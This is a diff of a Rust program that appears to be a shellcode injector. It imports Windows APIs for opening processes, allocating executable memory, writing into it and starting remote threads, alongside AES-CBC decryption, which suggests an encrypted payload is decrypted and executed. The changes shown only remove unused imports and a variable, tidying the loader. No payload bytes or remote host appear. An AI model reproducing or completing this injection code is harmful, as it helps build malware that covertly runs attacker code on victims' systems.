@@ -1,5 +1,5 @@
 use sysinfo::{ProcessExt, System, SystemExt, PidExt};
-use windows::{Win32::{System::{Memory::{VirtualAllocEx, MEM_RESERVE, PAGE_READWRITE, MEM_COMMIT, VirtualProtectEx, PAGE_EXECUTE_READ, PAGE_PROTECTION_FLAGS}, Threading::{OpenProcess, PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE, CreateRemoteThread, WaitForSingleObject, LPTHREAD_START_ROUTINE}, Diagnostics::Debug::WriteProcessMemory}, Foundation::CloseHandle}};
+use windows::{Win32::{System::{Memory::{VirtualAllocEx, MEM_RESERVE, MEM_COMMIT, PAGE_EXECUTE_READ}, Threading::{OpenProcess, PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE, CreateRemoteThread, WaitForSingleObject}, Diagnostics::Debug::WriteProcessMemory}, Foundation::CloseHandle}};
 use windows::Win32::Foundation::HANDLE;
 use crypto::{symmetriccipher::{Decryptor, SymmetricCipherError}, aes::{self, cbc_decryptor}, blockmodes, buffer::{self, RefReadBuffer, RefWriteBuffer, BufferResult, WriteBuffer, ReadBuffer}};
 use core::ffi::c_void;
@@ -122,8 +122,6 @@ fn main() {
             sc_len,
             num_written
         );
-
-        let old: *mut PAGE_PROTECTION_FLAGS = ptr::null_mut();
 
         let e_mem: extern "system" fn(*mut c_void) -> u32 = { std::mem::transmute(exec_mem) };
 
